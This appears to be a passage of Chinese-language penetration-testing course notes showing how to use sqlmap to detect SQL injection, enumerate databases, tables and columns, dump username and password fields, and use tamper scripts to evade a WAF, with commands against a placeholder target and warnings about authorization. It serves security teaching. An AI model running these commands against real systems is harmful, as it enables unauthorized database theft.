## 漏洞检测

![](img/47c0768b34867e7838ce6a6d18a7595a_22.png)

![](img/47c0768b34867e7838ce6a6d18a7595a_24.png)

上一节我们介绍了如何查看帮助，本节中我们来看看如何进行基本的漏洞检测。核心是使用 `-u` 参数指定目标URL。

检测漏洞主要使用 `-u` 参数，其后面跟随一个目标URL。此外，也可以使用 `-m` 参数对一个包含多个URL的文本文件进行批量检测。

以下是具体步骤：

1.  检测单个URL：
    ```bash
    sqlmap -u "http://target.com/page.php?id=1"
    ```
    执行后，SQLMap会进行探测。例如，它可能提示后端数据库看起来像是MySQL，并询问是否跳过检测其他数据库。用户可以选择 `Y` 或 `N` 进行确认。随后，工具会报告发现的注入点，例如检测到 `id` 参数存在漏洞。

![](img/47c0768b34867e7838ce6a6d18a7595a_26.png)

2.  批量检测URL：
    *   首先，将多个URL（每行一个）保存到一个文本文件中，例如 `urls.txt`。
    *   然后使用 `-m` 参数执行：
    ```bash
    sqlmap -m urls.txt
    ```

## 信息枚举与数据提取

![](img/47c0768b34867e7838ce6a6d18a7595a_34.png)

在确认存在SQL注入漏洞后，我们可以进一步枚举数据库信息。这个过程需要遵循授权和合法性的前提。

![](img/47c0768b34867e7838ce6a6d18a7595a_36.png)

### 枚举数据库

首先，我们可以枚举数据库管理系统中的所有数据库。

![](img/47c0768b34867e7838ce6a6d18a7595a_38.png)

使用 `--dbs` 参数可以枚举所有数据库：
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```
执行后会列出所有数据库名称。

![](img/47c0768b34867e7838ce6a6d18a7595a_40.png)

若只想获取当前网站使用的数据库名，可以使用 `--current-db` 参数：
```bash
sqlmap -u "http://target.com/page.php?id=1" --current-db
```

### 枚举数据表

在得知数据库名后，可以进一步枚举该数据库中的所有数据表。

![](img/47c0768b34867e7838ce6a6d18a7595a_42.png)

使用 `-D` 参数指定数据库名，结合 `--tables` 参数枚举数据表：
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
```

![](img/47c0768b34867e7838ce6a6d18a7595a_44.png)

### 枚举表字段（列）

![](img/47c0768b34867e7838ce6a6d18a7595a_46.png)

获取表名后，可以枚举该表的字段结构。

![](img/47c0768b34867e7838ce6a6d18a7595a_48.png)

使用 `-D` 指定数据库，`-T` 指定表名，结合 `--columns` 参数枚举字段：
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns
```

### 提取数据（拖库）

![](img/47c0768b34867e7838ce6a6d18a7595a_50.png)

**警告**：此操作仅应在获得明确授权的渗透测试中进行。未经授权的数据提取是非法行为。

![](img/47c0768b34867e7838ce6a6d18a7595a_52.png)

枚举出字段后，可以提取表中的具体数据。

使用 `-C` 参数指定要提取的字段名（多个字段用逗号分隔），结合 `--dump` 参数提取数据：
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name -C "username,password" --dump
```
提取的数据默认会以CSV格式保存在本地。

## 高级参数：Level与Risk

![](img/47c0768b34867e7838ce6a6d18a7595a_59.png)

SQLMap的检测深度和强度可以通过 `--level` 和 `--risk` 参数调整。

![](img/47c0768b34867e7838ce6a6d18a7595a_61.png)

![](img/47c0768b34867e7838ce6a6d18a7595a_62.png)

*   **`--level`**：测试等级（1-5），默认为1。等级越高，测试越全面（如测试Cookie、User-Agent、HTTP头等注入点），但速度越慢。
*   **`--risk`**：风险等级（1-3），默认为1。等级越高，使用的Payload可能更具侵入性，但也更容易触发防御机制。

例如，默认等级1只测试GET和POST参数。当 `--level` 设置为2或更高时，才会测试HTTP Cookie等头部字段。

![](img/47c0768b34867e7838ce6a6d18a7595a_64.png)

## 使用Tamper脚本绕过WAF

在实际环境中，网站可能部署了WAF来过滤恶意SQL语句。SQLMap提供了Tamper脚本，用于对Payload进行编码、混淆以绕过过滤。

### Tamper脚本原理

![](img/47c0768b34867e7838ce6a6d18a7595a_66.png)

每个Tamper脚本都对Payload进行特定变换。例如：
*   在关键词中插入注释符（如 `SEL/**/ECT`）。
*   在关键词中添加百分号（如 `S%E%L%E%C%T`）。
*   对关键词进行随机大小写转换（如 `SeLeCt`）。
*   对关键词进行双写绕过（如 `SELSELECTECT`）。

![](img/47c0768b34867e7838ce6a6d18a7595a_68.png)

![](img/47c0768b34867e7838ce6a6d18a7595a_69.png)

![](img/47c0768b34867e7838ce6a6d18a7595a_71.png)

### 使用方法

![](img/47c0768b34867e7838ce6a6d18a7595a_73.png)

使用 `--tamper` 参数指定脚本名（无需.py后缀）。可以结合 `-v 3` 参数查看Payload的详细变化过程。

以下是使用示例：

1.  使用`space2comment`脚本绕过空格过滤：
    ```bash
    sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
    ```

![](img/47c0768b34867e7838ce6a6d18a7595a_75.png)

2.  使用`randomcase`脚本进行随机大小写转换并查看详情：
    ```bash
    sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase -v 3
    ```

![](img/47c0768b34867e7838ce6a6d18a7595a_77.png)

![](img/47c0768b34867e7838ce6a6d18a7595a_79.png)

![](img/47c0768b34867e7838ce6a6d18a7595a_80.png)

选择Tamper脚本前，需要手动测试或分析以了解WAF过滤了哪些关键词，然后选用对应的脚本。
